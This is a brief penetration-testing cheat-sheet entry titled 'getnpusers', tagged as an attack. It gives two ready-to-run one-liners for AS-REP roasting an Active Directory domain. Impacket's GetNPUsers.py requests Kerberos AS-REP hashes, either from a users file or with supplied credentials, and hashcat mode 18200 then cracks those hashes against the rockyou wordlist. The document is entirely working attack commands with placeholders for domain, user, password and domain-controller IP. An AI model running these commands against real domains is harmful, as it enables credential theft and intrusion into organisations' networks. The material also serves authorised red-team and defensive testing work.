# getnpusers
#plateform/linux #target/remote #cat/ATTACK

## ASREPRoast with usersfile
```
GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/ -dc-ip <ip>; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## ASREPRoast with authentication
```
GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>':'<passwd>' -dc-ip <ip>; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```
